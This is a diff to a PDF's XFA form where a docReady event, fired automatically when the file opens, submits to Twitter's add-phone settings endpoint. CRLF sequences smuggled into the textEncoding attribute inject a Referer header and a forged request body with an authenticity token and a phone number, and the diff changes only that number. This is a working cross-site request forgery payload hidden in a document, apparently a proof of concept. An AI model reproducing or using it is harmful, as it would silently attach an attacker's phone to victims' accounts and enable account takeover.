@@ -18,7 +18,7 @@ stream
         <field id="Hello World!">
             <event activity="docReady" ref="$host" name="event__click">
                <submit 
-                     textEncoding="UTF-8&#xD;&#xA;Referer: https://twitter.com/settings/add_phone?edit_phone=true&#xD;&#xA;&#xD;&#xA;device_type=phone&#x26;authenticity_token=dee902a180e295646561e7c93802f14a5a41c0b7&#x26;device[country_code]=213&#x26;country_code=213&#x26;edit_phone=false&#x26;iso_code=DZ&#x26;phone_number=781077548&#x26;"
+                     textEncoding="UTF-8&#xD;&#xA;Referer: https://twitter.com/settings/add_phone?edit_phone=true&#xD;&#xA;&#xD;&#xA;device_type=phone&#x26;authenticity_token=dee902a180e295646561e7c93802f14a5a41c0b7&#x26;device[country_code]=213&#x26;country_code=213&#x26;edit_phone=false&#x26;iso_code=DZ&#x26;phone_number=781077547&#x26;"
                      xdpContent="pdf datasets template"
                      target="https://twitter.com/settings/add_phone"/>
             </event>
